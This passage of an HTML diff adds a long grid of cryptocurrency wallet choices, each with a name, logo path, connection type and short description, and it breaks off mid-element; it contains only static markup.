+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Xaman</div>
+                    <div class="wallet-description">Smart investing wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Aqua" data-logo="success/way/img/aqua.png"
+                  data-type="injected" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="success/way/img/aqua.png" alt="Aqua" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Aqua</div>
+                    <div class="wallet-description">Secure digital wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="BestWallet"
+                  data-logo="success/way/img/bestwallet.webp" data-type="walletconnect"
+                  style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="success/way/img/bestwallet.webp" alt="BestWallet" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">BestWallet</div>
+                    <div class="wallet-description">All-in-one crypto wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="BitBox" data-logo="success/way/img/bitbox.png"
+                  data-type="walletconnect" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="success/way/img/bitbox.png" alt="BitBox" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">BitBox</div>
+                    <div class="wallet-description">Hardware crypto wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Blockstream"
+                  data-logo="success/way/img/blockstream.png" data-type="walletconnect"
+                  style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="success/way/img/blockstream.png" alt="Blockstream" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Blockstream</div>
+                    <div class="wallet-description">Bitcoin &amp; Liquid wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Clover" data-logo="success/way/img/clover.png"
+                  data-type="walletconnect" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="success/way/img/clover.png" alt="Clover" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Clover</div>
+                    <div class="wallet-description">Cross-chain smart wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="CoinEx" data-logo="success/way/img/coinex.png"
+                  data-type="walletconnect" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="success/way/img/coinex.png" alt="CoinEx" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">CoinEx</div>
+                    <div class="wallet-description">Exchange wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="CoinList" data-logo="success/way/img/coinlist.png"
+                  data-type="injected" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="success/way/img/coinlist.png" alt="CoinList" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">CoinList</div>
+                    <div class="wallet-description">Investing &amp; trading wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="CoinRabbit"
+                  data-logo="success/way/img/coinrabbit.png" data-type="walletconnect"
+                  style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="success/way/img/coinrabbit.png" alt="CoinRabbit" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">CoinRabbit</div>
+                    <div class="wallet-description">Crypto lending wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="CoinSpot" data-logo="success/way/img/coinspot.jpg"
+                  data-type="walletconnect" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="success/way/img/coinspot.jpg" alt="CoinSpot" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">CoinSpot</div>
+                    <div class="wallet-description">Australian crypto wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="BitPay" data-logo="success/way/img/bitpay.jpg"
+                  data-type="walletconnect" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="success/way/img/bitpay.jpg" alt="BitPay" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">BitPay</div>
+                    <div class="wallet-description">Trusted payment wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Robinhood" data-logo="success/way/img/robinhood.png"
+                  data-type="injected" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="success/way/img/robinhood.png" alt="Robinhood" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Robinhood</div>
+                    <div class="wallet-description">Invest &amp; trade wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Blockchain" data-logo="assetsa/blockchain.webp"
+                  data-type="walletconnect" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/blockchain.webp" alt="Blockchain" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Block...</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Hot Wallet" data-logo="success/way/img/hot.png"
+                  data-type="injected" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="success/way/img/hot.png" alt="Hot Wallet" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Hot Wal..</div>
+                    <div class="wallet-description">Fast-access wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Kaola" data-logo="success/way/img/kaola.jpg"
+                  data-type="walletconnect" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="success/way/img/kaola.jpg" alt="Kaola" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Kaola</div>
+                    <div class="wallet-description">Multi-chain wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Leap" data-logo="success/way/img/leap.png"
+                  data-type="injected" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="success/way/img/leap.png" alt="Leap" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Leap</div>
+                    <div class="wallet-description">Cosmos ecosystem wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Nunchuck" data-logo="success/way/img/nunchuck.png"
+                  data-type="injected" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="success/way/img/nunchuck.png" alt="Nunchuck" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Nunchuck</div>
+                    <div class="wallet-description">Collaborative multisig wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Pali" data-logo="success/way/img/pali.png"
+                  data-type="injected" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="success/way/img/pali.png" alt="Pali" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Pali</div>
+                    <div class="wallet-description">Web3 crypto wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Eternl" data-logo="success/way/img/eternl.jpg"
+                  data-type="injected" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="success/way/img/eternl.jpg" alt="Eternl" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Eternl</div>
+                    <div class="wallet-description">Cardano light wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="wallETH" data-logo="success/way/img/walleth.jpg"
+                  data-type="injected" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="success/way/img/walleth.jpg" alt="wallETH" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">wallETH</div>
+                    <div class="wallet-description">Ethereum mobile wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Wasabi" data-logo="success/way/img/wasabi.png"
+                  data-type="injected" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="success/way/img/wasabi.png" alt="Wasabi" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Wasabi</div>
+                    <div class="wallet-description">Privacy-focused Bitcoin wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="XinFin" data-logo="success/way/img/xinfin.jpg"
+                  data-type="injected" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="success/way/img/xinfin.jpg" alt="XinFin" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">XinFin</div>
+                    <div class="wallet-description">XDC network wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Zcash" data-logo="success/way/img/zcash.png"
+                  data-type="injected" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="success/way/img/zcash.png" alt="Zcash" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Zcash</div>
+                    <div class="wallet-description">Smart investing wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Tangem" data-logo="success/way/img/tangem.png"
+                  data-type="injected" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="success/way/img/tangem.png" alt="Tangem" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Tangem</div>
+                    <div class="wallet-description">Smart investing wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Bybit" data-logo="assetsa/bybit.webp"
+                  data-type="walletconnect" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/bybit.webp" alt="Bybit" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Bybit</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Kraken" data-logo="assetsa/kraken.webp"
+                  data-type="injected" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/kraken.webp" alt="Kraken" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Kraken</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Torus" data-logo="assetsa/torus.webp"
+                  data-type="injected" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/torus.webp" alt="Torus" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Torus</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Atomic Wallet" data-logo="assetsa/atomic_wallet.webp"
+                  data-type="injected" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/atomic_wallet.webp" alt="Atomic Wallet" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Atomic...</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="CoolWallet" data-logo="assetsa/cool_wallet.webp"
+                  data-type="injected" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/cool_wallet.webp" alt="CoolWallet" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">CoolWallet</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Cosmostation" data-logo="assetsa/cosmostation.webp"
+                  data-type="injected" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/cosmostation.webp" alt="Cosmostation" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Cosmost...</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Bitpie" data-logo="assetsa/bitpie.webp"
+                  data-type="injected" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/bitpie.webp" alt="Bitpie" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Bitpie</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Zengo" data-logo="assetsa/zengo.webp"
+                  data-type="injected" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/zengo.webp" alt="Zengo" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Zengo</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Klever" data-logo="assetsa/klever.webp"
+                  data-type="injected" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/klever.webp" alt="Klever" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Klever</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Frontier" data-logo="assetsa/frontier.webp"
+                  data-type="injected" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/frontier.webp" alt="Frontier" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Frontier</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Loopring" data-logo="assetsa/loopring.webp"
+                  data-type="injected" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/loopring.webp" alt="Loopring" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Loopring</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Magic Eden" data-logo="assetsa/magic.webp"
+                  data-type="injected" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/magic.webp" alt="Magic Eden" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Magic...</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Enkrypt" data-logo="assetsa/enkrypt.webp"
+                  data-type="injected" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/enkrypt.webp" alt="Enkrypt" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Enkrypt</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Bitski" data-logo="assetsa/bitski.webp"
+                  data-type="injected" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/bitski.webp" alt="Bitski" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Bitski</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Block" data-logo="assetsa/block.webp"
+                  data-type="injected" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/block.webp" alt="Block" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Block</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Blocto" data-logo="assetsa/blocto.webp"
+                  data-type="injected" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/blocto.webp" alt="Blocto" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Blocto</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Bridge" data-logo="assetsa/bridge.webp"
+                  data-type="injected" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/bridge.webp" alt="Bridge" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Bridge</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Brise" data-logo="assetsa/brise.webp"
+                  data-type="injected" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/brise.webp" alt="Brise" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Brise</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Broearn" data-logo="assetsa/broearn.webp"
+                  data-type="injected" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/broearn.webp" alt="Broearn" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Broearn</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Buritto" data-logo="assetsa/buritto.webp"
+                  data-type="injected" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/buritto.webp" alt="Buritto" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Buritto</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Chain" data-logo="assetsa/chain.webp"
+                  data-type="injected" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/chain.webp" alt="Chain" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Chain</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Cypher" data-logo="assetsa/cypher.webp"
+                  data-type="injected" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/cypher.webp" alt="Cypher" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Cypher</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Defiant" data-logo="assetsa/defiant.webp"
+                  data-type="walletconnect" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/defiant.webp" alt="Defiant" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Defiant</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Haqq Wallet" data-logo="assetsa/haqq.webp"
+                  data-type="injected" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/haqq.webp" alt="Haqq Wallet" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Haqq...</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Halo" data-logo="assetsa/halo.webp"
+                  data-type="injected" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/halo.webp" alt="Halo" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Halo</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Hashpack" data-logo="assetsa/hashpack.webp"
+                  data-type="injected" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/hashpack.webp" alt="Hashpack" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Hashpack</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Haven1" data-logo="assetsa/haven.webp"
+                  data-type="walletconnect" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/haven.webp" alt="Haven1" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Haven</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Hero Wallet" data-logo="assetsa/hero.webp"
+                  data-type="injected" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/hero.webp" alt="Hero Wallet" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Hero</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Kresus" data-logo="assetsa/kresus.webp"
+                  data-type="injected" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/kresus.webp" alt="Kresus" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Kresus</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Lif3 Wallet" data-logo="assetsa/lif3.webp"
+                  data-type="injected" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/lif3.webp" alt="Lif3 Wallet" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Lif3</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Linen" data-logo="assetsa/linen.webp"
+                  data-type="injected" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/linen.webp" alt="Linen" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Linen</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Nabox" data-logo="assetsa/nabox.webp"
+                  data-type="injected" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/nabox.webp" alt="Nabox" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Nabox</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Nash" data-logo="assetsa/nash.webp"
+                  data-type="injected" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/nash.webp" alt="Nash" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Nash</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Omni" data-logo="assetsa/omni.webp"
+                  data-type="injected" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/omni.webp" alt="Omni" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Omni</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Passpay" data-logo="assetsa/passpay.webp"
+                  data-type="injected" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/passpay.webp" alt="Passpay" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Passpay</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Plasma" data-logo="assetsa/plasma.webp"
+                  data-type="injected" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/plasma.webp" alt="Plasma" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Plasma</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="xPortal" data-logo="assetsa/xportal.webp"
+                  data-type="injected" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/xportal.webp" alt="xPortal" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">xPortal</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Pure" data-logo="assetsa/pure.webp"
+                  data-type="injected" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/pure.webp" alt="Pure" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Pure</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Qoin" data-logo="assetsa/qoin.webp"
+                  data-type="injected" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/qoin.webp" alt="Qoin" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Qoin</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Qubetics" data-logo="assetsa/qubetics.webp"
+                  data-type="injected" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/qubetics.webp" alt="Qubetics" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Qubetics</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Qubic" data-logo="assetsa/qubic.webp"
+                  data-type="injected" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/qubic.webp" alt="Qubic" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Qubic</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Shido" data-logo="assetsa/shido.webp"
+                  data-type="injected" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/shido.webp" alt="Shido" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Shido</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Shyft" data-logo="assetsa/shyft.webp"
+                  data-type="injected" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/shyft.webp" alt="Shyft" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Shyft</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Slavi" data-logo="assetsa/slavi.webp"
+                  data-type="walletconnect" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/slavi.webp" alt="Slavi" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Slavi</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+  
+                <div class="wallet-option" data-title="CWallet" data-logo="success/way/img/cwallet.png"
+                  data-type="injected" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="success/way/img/cwallet.png" alt="CWallet" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">CWallet</div>
+                    <div class="wallet-description">Crypto asset manager</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Unisat" data-logo="success/way/img/unisat.png"
+                  data-type="walletconnect" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="success/way/img/unisat.png" alt="Unisat" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Unisat</div>
+                    <div class="wallet-description">Connect with WalletConnect</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Zerion" data-logo="success/way/img/zerion.png"
+                  data-type="walletconnect" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="success/way/img/zerion.png" alt="Zerion" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+          margin-bottom: 10px  !important
+          ">Zerion</div>
+                    <div class="wallet-description">Connect with WalletConnect</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Others" data-logo="success/way/img/auto.png"
+                  data-type="injected" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="success/way/img/auto.png" alt="Others" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+          margin-bottom: 10px  !important
